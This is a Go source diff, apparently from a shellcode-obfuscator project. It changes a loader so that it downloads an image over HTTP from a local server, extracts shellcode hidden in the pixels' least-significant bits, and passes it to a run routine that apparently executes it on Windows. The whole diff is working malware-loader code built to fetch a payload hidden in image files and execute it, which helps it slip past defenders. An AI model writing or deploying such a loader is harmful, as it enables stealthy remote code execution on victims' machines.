@@ -1,19 +1,20 @@
 package main
 
 import (
+	"bytes"
 	"image"
-	"os"
+	"io/ioutil"
+	"net/http"
 	"time"
 	"unsafe"
-
-	"golang.org/x/sys/windows"
 
 	_ "image/png"
 
 	_ "golang.org/x/image/bmp"
+	"golang.org/x/sys/windows"
 )
 
-const shellcode_len = 2208
+const shellcode_len = {{ MAX_BITS }}
 
 var payload_data [shellcode_len / 8]byte
 
@@ -21,9 +22,13 @@ func get_lsb(target byte, source byte) byte {
 	return (target << 1) | (source & 1)
 }
 
-func read_image(filename string) {
-	img_file, _ := os.Open(filename)
-	img, _, _ := image.Decode(img_file)
+func read_image(file_uri string) {
+
+	resp, _ := http.Get(file_uri)
+	img_data, _ := ioutil.ReadAll(resp.Body)
+	r := bytes.NewReader(img_data)
+
+	img, _, _ := image.Decode(r)
 	g := img.Bounds()
 
 	height := g.Dy()
@@ -67,6 +72,6 @@ func run() {
 }
 
 func main() {
-	read_image("C:/Users/Blackberry/Desktop/projects/yet-another-shellcode-obfuscator/samples/helpme_x64.png")
+	read_image("http://127.0.0.1:8000/shellcode_x64.bmp")
 	run()
 }
